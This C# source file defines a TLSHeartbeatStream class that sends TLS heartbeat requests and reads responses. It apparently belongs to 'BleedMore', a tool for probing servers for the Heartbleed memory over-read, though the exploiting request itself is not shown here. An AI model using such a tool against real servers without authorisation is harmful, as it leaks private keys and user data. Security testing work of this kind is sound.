using System;
using BleedMore.Protocol;

namespace BleedMore
{
    public sealed class TLSHeartbeatStream
    {
        public delegate void TLSHeartbeatResponseDelegate(TLSHeartbeatResponse rsp);

        public TLSHeartbeatStream(TLSStream stream)
        {
            this.stream = stream;
            this.stream.HeartbeatMessageEvent += new TLSStream.HeartbeatMessageDelegate(HandleHeartbeatMessage);
        }

        public event TLSHeartbeatResponseDelegate TLSHeartbeatResponseEvent;

        public void Send(TLSHeartbeatRequest o)
        {
            BufferStream bs = new BufferStream();
            bs.WriteUInt8(1);
            bs.Write(o);
            int length = bs.BytesWritten;
            stream.SendHeartbeatContent(stream.DefaultVersion, bs.Bytes, length);
        }

        private TLSStream stream;

        private void HandleHeartbeatMessage(TLSStream Stream, byte Type, int Length, BufferStream Data)
        {
            Console.WriteLine("[.] HeartbeatResponse, length {0}.", Length);
            TLSHeartbeatResponse rsp = Data.Read(Length, new TLSHeartbeatResponse());
            if (this.TLSHeartbeatResponseEvent != null)
            {
                this.TLSHeartbeatResponseEvent.Invoke(rsp);
            }
        }
    }
}
